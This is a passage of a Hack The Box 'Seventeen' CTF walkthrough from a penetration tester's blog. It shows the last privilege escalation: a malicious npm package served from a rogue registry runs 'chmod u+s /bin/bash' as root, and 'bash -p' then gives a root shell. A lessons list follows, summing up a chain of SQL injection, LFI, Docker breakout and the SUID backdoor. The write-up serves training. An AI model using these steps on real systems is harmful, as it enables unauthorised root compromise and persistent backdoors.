+<li><code>/usr/bin/node /opt/app/index.js</code> starts</li>
+<li><code>index.js</code> does <code>require('loglevel')</code> → loads our malicious <code>logger.js</code></li>
+<li>Our <code>cp.exec("chmod u+s /bin/bash")</code> runs as <strong>root</strong></li>
+<li>The app starts normally (or errors — doesn't matter)</li>
+</ol>
+<p><strong>Output:</strong></p>
+<pre><code>[=] Checking for db-logger
+[+] db-logger already installed
+[=] Checking for loglevel
+[+] Installing loglevel
+/opt/app
+├── loglevel@100.0.0 
+└── mysql@2.18.1 
+
+[+] Starting the app
+INFO:  Server running on port 8000
+</code></pre>
+<hr />
+<h3 id="step-7-5-getting-root">Step 7.5: Getting Root</h3>
+<pre><code class="language-bash" data-language="bash">ls -la /bin/bash
+# -rwsr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
+
+bash -p
+id
+# uid=1000(kavi) gid=1000(kavi) euid=0(root) groups=1000(kavi)
+
+cat /root/root.txt
+# d253d[redacted]edb892ca04
+</code></pre>
+<p><strong>Why <code>bash -p</code>?</strong></p>
+<ul>
+<li>When a binary has the <strong>SUID bit</strong> set (<code>s</code> instead of <code>x</code> in the owner permissions), running it gives you the <strong>effective UID</strong> of the owner (root).</li>
+<li>Normally, bash drops privileges. <code>bash -p</code> (preserve) tells bash to <strong>keep the effective UID</strong>.</li>
+<li>This gives us a root shell.</li>
+</ul>
+<p><strong>Hacker Mindset:</strong> <em>"I didn't need a reverse shell or a password. I just needed bash to remember it's supposed to be root. SUID is privilege elevation in its purest form."</em></p>
+<hr />
+<h2 id="key-lessons-and-takeaways">Key Lessons &amp; Takeaways</h2>
+<h3 id="1-the-domain-is-just-the-beginning">1. The Domain is Just the Beginning</h3>
+<p><code>seventeen.htb</code> wasn't the only target. VHost fuzzing revealed <code>exam</code>, <code>oldmanagement</code>, and <code>mastermailer</code>. <strong>Always fuzz for subdomains when you see a domain.</strong></p>
+<h3 id="2-sql-injection-is-intelligence-gathering">2. SQL Injection is Intelligence Gathering</h3>
+<p>The SQLi wasn't just about dumping passwords. The <code>avatar</code> column leaked a filesystem path that revealed a hidden subdomain. <strong>Every column is a clue.</strong></p>
+<h3 id="3-documents-are-intelligence">3. Documents are Intelligence</h3>
+<p>The PDF in the School File Management System wasn't "fluff." It contained the URL to the webmail service. <strong>Read every document you download.</strong></p>
+<h3 id="4-chain-chain-chain">4. Chain, Chain, Chain</h3>
+<p>No single vulnerability gave us root. We chained:</p>
+<ul>
+<li>SQLi → Credentials</li>
+<li>Credentials → File Upload</li>
+<li>File Upload → LFI</li>
+<li>LFI → Shell</li>
+<li>Shell → Docker Breakout</li>
+<li>Docker Breakout → Host Creds</li>
+<li>Host Creds → User Shell</li>
+<li>User Shell → Malicious NPM Package</li>
+<li>NPM Package → Root</li>
+</ul>
+<h3 id="5-npm-install-as-root-is-dangerous">5. npm install as Root is Dangerous</h3>
+<p>Any script that runs <code>npm install</code> as root is a privilege escalation waiting to happen. If you control the registry (or <code>.npmrc</code>), you control the code that executes as root.</p>
+<h3 id="6-clear-obstacles-before-exploiting">6. Clear Obstacles Before Exploiting</h3>
+<p>The most frustrating part of this box was that <code>/opt/app/node_modules/loglevel</code> already existed, so <code>npm install</code> was skipped. <strong>Deleting the existing module was the critical step</strong> that forced npm to fetch from our rogue registry.</p>
+<h3 id="7-suid-bash-is-reliable">7. SUID Bash is Reliable</h3>
+<p>Once you have <code>chmod u+s /bin/bash</code>, you have a persistent root backdoor. <code>bash -p</code> is the simplest privilege escalation technique in Linux.</p>
+<hr />
+<blockquote>
+<p><strong>Final Note:</strong> Seventeen is a masterclass in chaining. It teaches you that hard boxes aren't about one massive exploit — they're about patience, enumeration, and connecting the dots across multiple services.</p>
+</blockquote>
+8:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$d"}}]
+9:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-schooled-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: Schooled Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-sink-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: Sink Walkthrough"}]]}]}]]}]
+a:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+e:T531,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-seventeen-walkthrough/#article","headline":"Hack The Box: Seventeen Walkthrough","description":"An archived walkthrough of the retired Hack The Box Seventeen machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-seventeen-walkthrough/","datePublished":"2026-06-11T11:29:34.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2883,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/4346e82b10145c32196a6292250006cdaa8c420a/HTB-Seventeen.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-seventeen-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-seventeen-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Seventeen Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-seventeen-walkthrough/"}]}]}b:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$e"}}]
+c:["$","$Lf",null,{"children":["$","$10",null,{"name":"Next.MetadataOutlet","children":"$@11"}]}]
+11:null
